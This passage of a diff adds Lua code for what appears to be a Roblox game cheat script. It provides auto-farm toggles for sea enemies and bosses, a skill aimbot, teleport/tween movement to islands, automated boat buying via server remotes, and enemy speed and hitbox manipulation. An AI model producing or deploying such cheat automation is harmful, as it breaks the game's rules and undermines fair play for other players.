+                                        (game:GetService("RunService")).Heartbeat:wait();
+                                        AutoHaki();
+                                        EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                        Attack();
+                                        _G.SeaSkill = false;
+                                    until not _G.Settings.SeaEvent["Auto Farm Fish Crew Member"] or (not v.Parent) or
+                                        v.Humanoid.Health <= 0;
+                                end
+                            end
+                        end
+                    end
+                elseif _G.Settings.SeaEvent["Sail Boat"] and
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("FishBoat") and
+                    _G.Settings.SeaEvent["Auto Farm Ghost Ship"] then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if (game:GetService("Workspace")).Enemies:FindFirstChild("FishBoat") then
+                            repeat
+                                (game:GetService("RunService")).Heartbeat:wait();
+                                local BoatCFrame = v.Engine.CFrame;
+                                if (BoatCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <=
+                                    50 then
+                                    _G.SeaSkill = true;
+                                else
+                                    _G.SeaSkill = false;
+                                end
+                                TweenPlayer(BoatCFrame);
+                                AutoHaki();
+                                Skillaimbot = true;
+                                AimSkill = v.Engine.CFrame * CFrame.new(0, (-15), 0);
+                                AimBotSkillPosition = AimSkill.Position;
+                            until not v.Parent or v.Health < 0 or
+                                (not (game:GetService("Workspace")).Enemies:FindFirstChild("FishBoat")) or
+                                (not v:FindFirstChild("Engine")) or (not _G.Settings.SeaEvent["Auto Farm Ghost Ship"]);
+                            Skillaimbot = false;
+                            _G.SeaSkill = false;
+                        end
+                    end
+                elseif _G.Settings.SeaEvent["Sail Boat"] and
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("PirateGrandBrigade") and
+                    _G.Settings.SeaEvent["Auto Farm Pirate Grand Brigade"] then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if (game:GetService("Workspace")).Enemies:FindFirstChild("PirateGrandBrigade") then
+                            repeat
+                                (game:GetService("RunService")).Heartbeat:wait();
+                                local BoatCFrame = v.Engine.CFrame;
+                                AutoHaki();
+                                if (BoatCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <=
+                                    50 then
+                                    _G.SeaSkill = true;
+                                else
+                                    _G.SeaSkill = false;
+                                end
+                                TweenPlayer(BoatCFrame);
+                                Skillaimbot = true;
+                                AimSkill = v.Engine.CFrame * CFrame.new(0, (-15), 0);
+                                AimBotSkillPosition = AimSkill.Position;
+                            until not v.Parent or v.Health.Value < 0 or
+                                (not (game:GetService("Workspace")).Enemies:FindFirstChild("PirateGrandBrigade")) or
+                                (not v:FindFirstChild("Engine")) or
+                                (not _G.Settings.SeaEvent["Auto Farm Pirate Grand Brigade"]);
+                            Skillaimbot = false;
+                            _G.SeaSkill = false;
+                        end
+                    end
+                elseif _G.Settings.SeaEvent["Sail Boat"] and
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("PirateBrigade") and
+                    _G.Settings.SeaEvent["Auto Farm Pirate Brigade"] then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if (game:GetService("Workspace")).Enemies:FindFirstChild("PirateBrigade") then
+                            repeat
+                                (game:GetService("RunService")).Heartbeat:wait();
+                                local BoatCFrame = v.Engine.CFrame;
+                                if (BoatCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <=
+                                    50 then
+                                    _G.SeaSkill = true;
+                                else
+                                    _G.SeaSkill = false;
+                                end
+                                TweenPlayer(BoatCFrame);
+                                Skillaimbot = true;
+                                AutoHaki();
+                                AimSkill = v.Engine.CFrame * CFrame.new(0, (-15), 0);
+                                AimBotSkillPosition = AimSkill.Position;
+                            until not v.Parent or v.Health.Value < 0 or
+                                (not (game:GetService("Workspace")).Enemies:FindFirstChild("PirateBrigade")) or
+                                (not v:FindFirstChild("Engine")) or
+                                (not _G.Settings.SeaEvent["Auto Farm Pirate Brigade"]);
+                            Skillaimbot = false;
+                            _G.SeaSkill = false;
+                        end
+                    end
+                elseif _G.Settings.SeaEvent["Sail Boat"] and CheckSeaBeast() and
+                    _G.Settings.SeaEvent["Auto Farm Seabeasts"] then
+                    if (game:GetService("Workspace")):FindFirstChild("SeaBeasts") then
+                        for i, v in pairs((game:GetService("Workspace")).SeaBeasts:GetChildren()) do
+                            if CheckSeaBeast() then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    CFrameSeaBeast = v.HumanoidRootPart.CFrame * CFrame.new(0, 400, 0);
+                                    if (CFrameSeaBeast.Position -
+                                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Position).Magnitude <=
+                                        400 then
+                                        _G.SeaSkill = true;
+                                    else
+                                        _G.SeaSkill = false;
+                                    end
+                                    AutoHaki();
+                                    Skillaimbot = true;
+                                    AimBotSkillPosition = v.HumanoidRootPart.CFrame.Position;
+                                    if DodgeSeabeasts() then
+                                        TweenPlayer(v.HumanoidRootPart.CFrame *
+                                                        CFrame.new(math.random((-200), 300), 400,
+                                                math.random((-200), 300)));
+                                    else
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * CFrame.new(0, 400, 0));
+                                    end
+                                until not _G.Settings.SeaEvent["Auto Farm Seabeasts"] or CheckSeaBeast() == false or
+                                    (not v:FindFirstChild("Humanoid")) or (not v:FindFirstChild("HumanoidRootPart")) or
+                                    v.Humanoid.Health <= 0 or (not v.Parent);
+                                Skillaimbot = false;
+                                _G.SeaSkill = false;
+                            else
+                                Skillaimbot = false;
+                                _G.SeaSkill = false;
+                            end
+                        end
+                    end
+                elseif _G.Settings.SeaEvent["Sail Boat"] and
+                    (game:GetService("Workspace")).Enemies:FindFirstChild("Terrorshark") and
+                    _G.Settings.SeaEvent["Auto Farm Terrorshark"] then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if (game:GetService("Workspace")).Enemies:FindFirstChild("Terrorshark") then
+                            if v.Name == "Terrorshark" then
+                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                    v.Humanoid.Health > 0 then
+                                    repeat
+                                        (game:GetService("RunService")).Heartbeat:wait();
+                                        AutoHaki();
+                                        EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                        Attack();
+                                        _G.SeaSkill = false;
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * CFrame.new(0, 50, 0));
+                                    until not _G.Settings.SeaEvent["Auto Farm Terrorshark"] or (not v.Parent) or
+                                        v.Humanoid.Health <= 0;
+                                end
+                            end
+                        end
+                    end
+                elseif _G.Settings.SeaEvent["Sail Boat"] and CheckPiranha() and
+                    _G.Settings.SeaEvent["Auto Farm Piranha"] then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if (game:GetService("Workspace")).Enemies:FindFirstChild("Piranha") then
+                            if v.Name == "Piranha" then
+                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                    v.Humanoid.Health > 0 then
+                                    repeat
+                                        (game:GetService("RunService")).Heartbeat:wait();
+                                        AutoHaki();
+                                        EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                        Attack();
+                                        _G.SeaSkill = false;
+                                    until not _G.Settings.SeaEvent["Auto Farm Piranha"] or (not v.Parent) or
+                                        v.Humanoid.Health <= 0;
+                                end
+                            end
+                        end
+                    end
+                elseif _G.Settings.SeaEvent["Sail Boat"] and CheckShark() and _G.Settings.SeaEvent["Auto Farm Shark"] then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if (game:GetService("Workspace")).Enemies:FindFirstChild("Shark") then
+                            if v.Name == "Shark" then
+                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                    v.Humanoid.Health > 0 then
+                                    repeat
+                                        (game:GetService("RunService")).Heartbeat:wait();
+                                        AutoHaki();
+                                        EquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                                        TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                        Attack();
+                                        _G.SeaSkill = false;
+                                    until not _G.Settings.SeaEvent["Auto Farm Shark"] or (not v.Parent) or
+                                        v.Humanoid.Health <= 0;
+                                end
+                            end
+                        end
+                    end
+                else
+                    Skillaimbot = false;
+                    _G.SeaSkill = false;
+                    UnEquipWeapon(_G.Settings.Main["Selected Weapon"]);
+                end
+            end);
+        end
+    end
+end);
+function DodgeSeabeasts()
+    local seaBeastsFolder = (game:GetService("Workspace")).SeaBeasts;
+    for _, seaBeast in pairs(seaBeastsFolder:GetChildren()) do
+        if seaBeast:FindFirstChild("Humanoid") and seaBeast:FindFirstChild("Anims") then
+            local humanoid = seaBeast.Humanoid;
+            local animator = humanoid:FindFirstChildOfClass("Animator") or humanoid;
+            for _, anim in pairs(seaBeast.Anims:GetChildren()) do
+                if anim:IsA("Animation") then
+                    if anim.AnimationId == "rbxassetid://8708221792" or anim.AnimationId == "rbxassetid://8708222556" or
+                        anim.AnimationId == "rbxassetid://8708223619" or anim.AnimationId == "rbxassetid://8708225668" then
+                        for _, animationTrack in pairs(animator:GetPlayingAnimationTracks()) do
+                            if animationTrack.Animation.AnimationId == anim.AnimationId then
+                                if animationTrack.IsPlaying then
+                                    return true;
+                                else
+                                    return false;
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+SeaEventEnemiesSection = Tabs.SeaEventTab:Section({
+    Title = "Enemies",
+    TextXAlignment = "Left"
+});
+AutoFarmSharkToggle = Tabs.SeaEventTab:Toggle({
+    Title = "Auto Farm Shark",
+    Value = _G.Settings.SeaEvent["Auto Farm Shark"],
+    Callback = function(state)
+        _G.Settings.SeaEvent["Auto Farm Shark"] = state;
+        StopTween(_G.Settings.SeaEvent["Auto Farm Shark"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoFarmPiranhaToggle = Tabs.SeaEventTab:Toggle({
+    Title = "Auto Farm Piranha",
+    Value = _G.Settings.SeaEvent["Auto Farm Piranha"],
+    Callback = function(state)
+        _G.Settings.SeaEvent["Auto Farm Piranha"] = state;
+        StopTween(_G.Settings.SeaEvent["Auto Farm Piranha"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoFarmFishCrewMemberToggle = Tabs.SeaEventTab:Toggle({
+    Title = "Auto Farm Fish Crew Member",
+    Value = _G.Settings.SeaEvent["Auto Farm Fish Crew Member"],
+    Callback = function(state)
+        _G.Settings.SeaEvent["Auto Farm Fish Crew Member"] = state;
+        StopTween(_G.Settings.SeaEvent["Auto Farm Fish Crew Member"]);
+        (getgenv()).SaveSetting();
+    end
+});
+SeaEventBoatSection = Tabs.SeaEventTab:Section({
+    Title = "Boat",
+    TextXAlignment = "Left"
+});
+AutoFarmGhostShipToggle = Tabs.SeaEventTab:Toggle({
+    Title = "Auto Farm Ghost Ship",
+    Value = _G.Settings.SeaEvent["Auto Farm Ghost Ship"],
+    Callback = function(state)
+        _G.Settings.SeaEvent["Auto Farm Ghost Ship"] = state;
+        StopTween(_G.Settings.SeaEvent["Auto Farm Ghost Ship"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoFarmPirateBrigadeToggle = Tabs.SeaEventTab:Toggle({
+    Title = "Auto Farm Pirate Brigade",
+    Value = _G.Settings.SeaEvent["Auto Farm Pirate Brigade"],
+    Callback = function(state)
+        _G.Settings.SeaEvent["Auto Farm Pirate Brigade"] = state;
+        StopTween(_G.Settings.SeaEvent["Auto Farm Pirate Brigade"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoFarmPirateGrandBrigadeToggle = Tabs.SeaEventTab:Toggle({
+    Title = "Auto Farm Pirate Grand Brigade",
+    Value = _G.Settings.SeaEvent["Auto Farm Pirate Grand Brigade"],
+    Callback = function(state)
+        _G.Settings.SeaEvent["Auto Farm Pirate Grand Brigade"] = state;
+        StopTween(_G.Settings.SeaEvent["Auto Farm Pirate Grand Brigade"]);
+        (getgenv()).SaveSetting();
+    end
+});
+SeaEventBossSection = Tabs.SeaEventTab:Section({
+    Title = "Boss",
+    TextXAlignment = "Left"
+});
+AutoFarmTerrorsharkToggle = Tabs.SeaEventTab:Toggle({
+    Title = "Auto Farm Terrorshark",
+    Value = _G.Settings.SeaEvent["Auto Farm Terrorshark"],
+    Callback = function(state)
+        _G.Settings.SeaEvent["Auto Farm Terrorshark"] = state;
+        StopTween(_G.Settings.SeaEvent["Auto Farm Terrorshark"]);
+        (getgenv()).SaveSetting();
+    end
+});
+AutoFarmSeabeastsToggle = Tabs.SeaEventTab:Toggle({
+    Title = "Auto Farm Seabeasts",
+    Value = _G.Settings.SeaEvent["Auto Farm Seabeasts"],
+    Callback = function(state)
+        _G.Settings.SeaEvent["Auto Farm Seabeasts"] = state;
+        StopTween(_G.Settings.SeaEvent["Auto Farm Seabeasts"]);
+        (getgenv()).SaveSetting();
+    end
+});
+SeaStackSection = Tabs.SeaStackTab:Section({
+    Title = "Sea Stack",
+    TextXAlignment = "Left"
+});
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if game.Workspace._WorldOrigin.Locations:FindFirstChild("Mirage Island") then
+                MirageStatusSeaStackParagraph:SetDesc("✅ Mirage Island Spawning");
+            else
+                MirageStatusSeaStackParagraph:SetDesc("❌ Mirage Island Not Spawn");
+            end
+            if game.Workspace._WorldOrigin.Locations:FindFirstChild("Kitsune Island") then
+                KitsuneStatusSeaStackParagraph:SetDesc("✅ Kitsune Island Spawning");
+            else
+                KitsuneStatusSeaStackParagraph:SetDesc("❌ Kitsune Island Not Spawn");
+            end
+            if game.Workspace._WorldOrigin.Locations:FindFirstChild("Frozen Dimension") then
+                FrozenStatusSeaStackParagraph:SetDesc("✅ Frozen Dimension Spawning");
+            else
+                FrozenStatusSeaStackParagraph:SetDesc("❌ Frozen Dimension Not Spawn");
+            end
+            if game.Workspace._WorldOrigin.Locations:FindFirstChild("Prehistoric Island") then
+                PrehistoricStatusSeaStackParagraph:SetDesc("✅ Prehistoric Island Spawning");
+            else
+                PrehistoricStatusSeaStackParagraph:SetDesc("❌ Prehistoric Island Not Spawn");
+            end
+        end
+    end);
+end);
+PrehistoricStatusSeaStackParagraph = Tabs.SeaStackTab:Paragraph({
+    Title = "Prehistoric Status",
+    Desc = "N/A"
+});
+AutoSummonPrehistoricIslandToggle = Tabs.SeaStackTab:Toggle({
+    Title = "Summon Prehistoric Island",
+    Desc = "Need Volcanic Magnet",
+    Value = _G.Settings.SeaStack["Summon Prehistoric Island"],
+    Callback = function(state)
+        _G.Settings.SeaStack["Summon Prehistoric Island"] = state;
+        StopTween(_G.Settings.SeaStack["Summon Prehistoric Island"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        pcall(function()
+            if _G.Settings.SeaStack["Summon Prehistoric Island"] and World3 then
+                if not (game:GetService("Workspace")).Boats:FindFirstChild(_G.Settings.SeaEvent["Selected Boat"]) then
+                    local BuyBoatCFrame = CFrame.new(-16927.451171875, 9.0863618850708, 433.8642883300781);
+                    if (BuyBoatCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >
+                        2000 then
+                        BTP(BuyBoatCFrame);
+                    else
+                        BuyBoat = TweenPlayer(BuyBoatCFrame);
+                    end
+                    if ((CFrame.new((-16927.451171875), 9.0863618850708, 433.8642883300781)).Position -
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 10 then
+                        if BuyBoat then
+                            BuyBoat:Stop();
+                        end
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyBoat", _G.Settings
+                            .SeaEvent["Selected Boat"]);
+                        wait(1);
+                    end
+                elseif (game:GetService("Workspace")).Boats:FindFirstChild(_G.Settings.SeaEvent["Selected Boat"]) then
+                    repeat
+                        wait();
+                        if (game.Players.LocalPlayer.Character:WaitForChild("Humanoid")).Sit == false then
+                            if TweenBoatPrehistoric then
+                                TweenBoatPrehistoric:Stop();
+                            end
+                            local stoppos = TweenPlayer(((game:GetService("Workspace")).Boats:FindFirstChild(_G.Settings
+                                                                                                                 .SeaEvent["Selected Boat"])).VehicleSeat
+                                                            .CFrame * CFrame.new(0, 1, 0));
+                        elseif (game.Players.LocalPlayer.Character:WaitForChild("Humanoid")).Sit == true then
+                            TweenBoatPrehistoric = TweenBoat(
+                                CFrame.new(-148073.359, 8.99999523, 7721.05078, -0.0825930536, -0.00000154416148,
+                                    0.996583343, -0.000018696026, 1, -0.000000000000391858095, -0.996583343,
+                                    -0.0000186321486, -0.0825930536));
+                        end
+                    until not _G.Settings.SeaStack["Summon Prehistoric Island"] or
+                        game.Workspace._WorldOrigin.Locations:FindFirstChild("Prehistoric Island");
+                    if TweenBoatPrehistoric then
+                        TweenBoatPrehistoric:Stop();
+                    end
+                end
+            end
+        end);
+    end
+end);
+TweenToPrehistoricIslandToggle = Tabs.SeaStackTab:Toggle({
+    Title = "Tween To Prehistoric Island",
+    Desc = "Need Spawn",
+    Value = _G.Settings.SeaStack["Tween To Prehistoric Island"],
+    Callback = function(state)
+        _G.Settings.SeaStack["Tween To Prehistoric Island"] = state;
+        StopTween(_G.Settings.SeaStack["Tween To Prehistoric Island"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait() do
+        if _G.Settings.SeaStack["Tween To Prehistoric Island"] then
+            pcall(function()
+                if (game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Prehistoric Island") then
+                    TweenPlayer(((game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild(
+                        "Prehistoric Island")).CFrame);
+                end
+            end);
+        end
+    end
+end);
+AutoKillLavaGolemToggle = Tabs.SeaStackTab:Toggle({
+    Title = "Auto Kill Lava Golem",
+    Value = _G.Settings.SeaStack["Auto Kill Lava Golem"],
+    Callback = function(state)
+        _G.Settings.SeaStack["Auto Kill Lava Golem"] = state;
+        StopTween(_G.Settings.SeaStack["Auto Kill Lava Golem"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.DragonDojo["Auto Kill Lava Golem"] and World3 then
+            pcall(function()
+                if (game:GetService("Workspace")).Enemies:FindFirstChild("Lava Golem") then
+                    for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+                        if v.Name == "Lava Golem" then
+                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and
+                                v.Humanoid.Health > 0 then
+                                repeat
+                                    (game:GetService("RunService")).Heartbeat:wait();
+                                    AutoHaki();
+                                    EquipWeapon(_G.Settings.SeaStack["Selected Weapon"]);
+                                    v.Humanoid.WalkSpeed = 0;
+                                    v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+                                    PosMon = v.HumanoidRootPart.CFrame;
+                                    MonFarm = v.Name;
+                                    TweenPlayer(v.HumanoidRootPart.CFrame * Pos);
+                                    Attack();
+                                until not _G.Settings.DragonDojo["Auto Kill Lava Golem"] or (not v.Parent) or
+                                    v.Humanoid.Health <= 0;
+                            end
+                        end
+                    end
+                end
+            end);
+        end
+    end
+end);
+FrozenStatusSeaStackParagraph = Tabs.SeaStackTab:Paragraph({
+    Title = "Frozen Status",
+    Desc = "N/A"
+});
+AutoSummonFrozenDimensionToggle = Tabs.SeaStackTab:Toggle({
+    Title = "Summon Frozen Dimension",
+    Value = _G.Settings.SeaStack["Summon Frozen Dimension"],
+    Callback = function(state)
+        _G.Settings.SeaStack["Summon Frozen Dimension"] = state;
+        StopTween(_G.Settings.SeaStack["Summon Frozen Dimension"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        pcall(function()
+            if _G.Settings.SeaStack["Summon Frozen Dimension"] and World3 then
+                if not (game:GetService("Workspace")).Boats:FindFirstChild(_G.Settings.SeaEvent["Selected Boat"]) then
+                    local BuyBoatCFrame = CFrame.new(-16927.451171875, 9.0863618850708, 433.8642883300781);
+                    if (BuyBoatCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >
+                        2000 then
+                        BTP(BuyBoatCFrame);
+                    else
+                        BuyBoat = TweenPlayer(BuyBoatCFrame);
+                    end
+                    if ((CFrame.new((-16927.451171875), 9.0863618850708, 433.8642883300781)).Position -
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 10 then
+                        if BuyBoat then
+                            BuyBoat:Stop();
+                        end
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyBoat", _G.Settings
+                            .SeaEvent["Selected Boat"]);
+                        wait(1);
+                    end
+                elseif (game:GetService("Workspace")).Boats:FindFirstChild(_G.Settings.SeaEvent["Selected Boat"]) then
+                    repeat
+                        wait();
+                        if (game.Players.LocalPlayer.Character:WaitForChild("Humanoid")).Sit == false then
+                            if TweenBoatFrozen then
+                                TweenBoatFrozen:Stop();
+                            end
+                            local stoppos = TweenPlayer(((game:GetService("Workspace")).Boats:FindFirstChild(_G.Settings
+                                                                                                                 .SeaEvent["Selected Boat"])).VehicleSeat
+                                                            .CFrame * CFrame.new(0, 1, 0));
+                        elseif (game.Players.LocalPlayer.Character:WaitForChild("Humanoid")).Sit == true then
+                            TweenBoatFrozen = TweenBoat(CFrame.new(-148073.359, 8.99999523, 7721.05078, -0.0825930536,
+                                -0.00000154416148, 0.996583343, -0.000018696026, 1, -0.000000000000391858095,
+                                -0.996583343, -0.0000186321486, -0.0825930536));
+                        end
+                    until not _G.Settings.SeaStack["Summon Frozen Dimension"] or
+                        game.Workspace._WorldOrigin.Locations:FindFirstChild("Frozen Dimension");
+                    if TweenBoatFrozen then
+                        TweenBoatFrozen:Stop();
+                    end
+                end
+            end
+        end);
+    end
+end);
+TweenToFrozenDimensionToggle = Tabs.SeaStackTab:Toggle({
+    Title = "Tween To Frozen Dimension",
+    Value = _G.Settings.SeaStack["Tween To Frozen Dimension"],
+    Callback = function(state)
+        _G.Settings.SeaStack["Tween To Frozen Dimension"] = state;
+        StopTween(_G.Settings.SeaStack["Tween To Frozen Dimension"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.SeaStack["Tween To Frozen Dimension"] then
+            pcall(function()
+                repeat
+                    wait();
+                    TweenPlayer(
+                        ((game:GetService("Workspace"))._WorldOrigin.Locations:FindFirstChild("Frozen Dimension")).CFrame);
+                until not _G.Settings.SeaStack["Tween To Frozen Dimension"];
+            end);
+        end
+    end
+end);
+BribeLeviathanStatusParagraph = Tabs.SeaStackTab:Paragraph({
+    Title = "Leviathan Status",
+    Desc = "0"
+});
+BribeLeviathanButton = Tabs.SeaStackTab:Button({
+    Title = "Bribe Leviathan",
+    Callback = function()
+        local Status = (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("InfoLeviathan", "2");
+        BribeLeviathanStatusParagraph:SetDesc(Status);
+    end
+});
+KitsuneStatusSeaStackParagraph = Tabs.SeaStackTab:Paragraph({
+    Title = "Kitsune Status",
+    Desc = "N/A"
+});
+AutoSummonKitsuneIslandToggle = Tabs.SeaStackTab:Toggle({
+    Title = "Summon Kitsune Island",
+    Value = _G.Settings.SeaStack["Summon Kitsune Island"],
+    Callback = function(state)
+        _G.Settings.SeaStack["Summon Kitsune Island"] = state;
+        StopTween(_G.Settings.SeaStack["Summon Kitsune Island"]);
+        (getgenv()).SaveSetting();
+    end
+});
+TweenToKitsuneIslandToggle = Tabs.SeaStackTab:Toggle({
+    Title = "Tween To Kitsune Island",
+    Value = _G.Settings.SeaStack["Tween To Kitsune Island"],
+    Callback = function(state)
+        _G.Settings.SeaStack["Tween To Kitsune Island"] = state;
+        StopTween(_G.Settings.SeaStack["Tween To Kitsune Island"]);
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.SeaStack["Tween To Kitsune Island"] and World3 then
+            if (game:GetService("Workspace")).Map:FindFirstChild("KitsuneIsland") then
+                TweenPlayer(game.Workspace.Map.KitsuneIsland.ShrineActive.NeonShrinePart.CFrame * CFrame.new(0, 0, 10));
+            end
+        end
+    end
+end);
+spawn(function()
+    while wait(0.2) do
+        pcall(function()
+            if _G.Settings.SeaStack["Summon Kitsune Island"] and World3 then
+                if not (game:GetService("Workspace")).Boats:FindFirstChild(_G.Settings.SeaEvent["Selected Boat"]) then
+                    local BuyBoatCFrame = CFrame.new(-16927.451171875, 9.0863618850708, 433.8642883300781);
+                    if (BuyBoatCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >
+                        2000 then
+                        BTP(BuyBoatCFrame);
+                    else
+                        BuyBoatKitsune = TweenPlayer(BuyBoatCFrame);
+                    end
+                    if ((CFrame.new((-16927.451171875), 9.0863618850708, 433.8642883300781)).Position -
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 10 then
+                        if BuyBoatKitsune then
+                            BuyBoatKitsune:Stop();
+                        end
+                        (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("BuyBoat", _G.Settings
+                            .SeaEvent["Selected Boat"]);
+                        wait(1);
+                    end
+                elseif (game:GetService("Workspace")).Boats:FindFirstChild(_G.Settings.SeaEvent["Selected Boat"]) then
+                    repeat
+                        wait();
+                        if (game.Players.LocalPlayer.Character:WaitForChild("Humanoid")).Sit == false then
+                            if TweenBoatKitsune then
+                                TweenBoatKitsune:Stop();
+                            end
+                            local stoppos = TweenPlayer(((game:GetService("Workspace")).Boats:FindFirstChild(_G.Settings
+                                                                                                                 .SeaEvent["Selected Boat"])).VehicleSeat
+                                                            .CFrame * CFrame.new(0, 1, 0));
+                        elseif (game.Players.LocalPlayer.Character:WaitForChild("Humanoid")).Sit == true then
+                            TweenBoatKitsune = TweenBoat(CFrame.new(-44541.7617, 30.0003204, -1244.8584, -0.0844199061,
+                                -0.00553312758, 0.9964149, -0.0654025897, 0.997858942, 0.000000000202319411,
+                                -0.99428153, -0.0651681125, -0.0846010372));
+                        end
+                    until not _G.Settings.SeaStack["Summon Kitsune Island"] or
+                        game.Workspace._WorldOrigin.Locations:FindFirstChild("Kitsune Island");
+                    if TweenBoatKitsune then
+                        TweenBoatKitsune:Stop();
+                    end
+                end
+            end
+        end);
+    end
+end);
+AutoCollectAzureEmberToggle = Tabs.SeaStackTab:Toggle({
+    Title = "Auto Collect Azure Ember",
+    Value = _G.Settings.SeaStack["Auto Collect Azure Ember"],
+    Callback = function(state)
+        _G.Settings.SeaStack["Auto Collect Azure Ember"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.SeaStack["Auto Collect Azure Ember"] and World3 then
+            pcall(function()
+                if (game:GetService("Workspace")):FindFirstChild("AttachedAzureEmber") then
+                    TweenPlayer(
+                        (((game:GetService("Workspace")):WaitForChild("EmberTemplate")):FindFirstChild("Part")).CFrame);
+                end
+            end);
+        end
+    end
+end);
+SetAzureEmberSlider = Tabs.SeaStackTab:Slider({
+    Title = "Set Azure Ember",
+    Step = 1,
+    Value = {
+        Min = 1,
+        Max = 25,
+        Default = _G.Settings.SeaStack["Set Azure Ember"]
+    },
+    Callback = function(value)
+        _G.Settings.SeaStack["Set Azure Ember"] = value;
+        (getgenv()).SaveSetting();
+    end
+});
+AutoTradeAzureEmberToggle = Tabs.SeaStackTab:Toggle({
+    Title = "Auto Trade Azure Ember",
+    Value = _G.Settings.SeaStack["Auto Trade Azure Ember"],
+    Callback = function(state)
+        _G.Settings.SeaStack["Auto Trade Azure Ember"] = state;
+        (getgenv()).SaveSetting();
+    end
+});
+function GetCountMaterials(MaterialName)
+    local Inventory = (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("getInventory");
+    for i, v in pairs(Inventory) do
+        if v.Name == MaterialName then
+            return v.Count;
+        end
+    end
+end
+spawn(function()
+    while wait(0.2) do
+        if _G.Settings.SeaStack["Auto Trade Azure Ember"] and World3 then
+            pcall(function()
+                local AzureAvilable = GetCountMaterials("Azure Ember");
+                if AzureAvilable >= _G.Settings.SeaStack["Set Azure Ember"] then
+                    ((game:GetService("ReplicatedStorage")).Modules.Net:FindFirstChild("RF/KitsuneStatuePray")):InvokeServer();
+                    (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("KitsuneStatuePray");
+                end
+            end);
+        end
+    end
+end);
+MirageStatusSeaStackParagraph = Tabs.SeaStackTab:Paragraph({
+    Title = "Mirage Status",
+    Desc = "N/A"
+});
+TweenToMirageIslandToggle = Tabs.SeaStackTab:Toggle({
+    Title = "Tween To Mirage Island",
+    Value = _G.Settings.SeaStack["Tween To Mirage Island"],
+    Callback = function(state)
+        _G.Settings.SeaStack["Tween To Mirage Island"] = state;
+        StopTween(_G.Settings.SeaStack["Tween To Mirage Island"]);
+        (getgenv()).SaveSetting();
+    end
+});
+function GetHighestPoint()
+    for i, v in pairs((game:GetService("Workspace")).Map.MysticIsland:GetDescendants()) do
+        if v:IsA("MeshPart") then
+            if v.MeshId == "rbxassetid://6745037796" then
+                return v;
+            end
+        end
+    end
+end
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if _G.Settings.Race["Tween To Highest Mirage"] then
+                if (game:GetService("Workspace")).Map:FindFirstChild("MysticIsland") then
+                    TweenPlayer((GetHighestPoint()).CFrame * CFrame.new(0, 211.88, 0));
+                end
+            end
+        end
+    end);
+end);
+spawn(function()
+    pcall(function()
+        while wait(0.2) do
+            if _G.Settings.Race["Tween To Mirage Island"] then
+                if (game:GetService("Workspace")).Map:FindFirstChild("MysticIsland") then
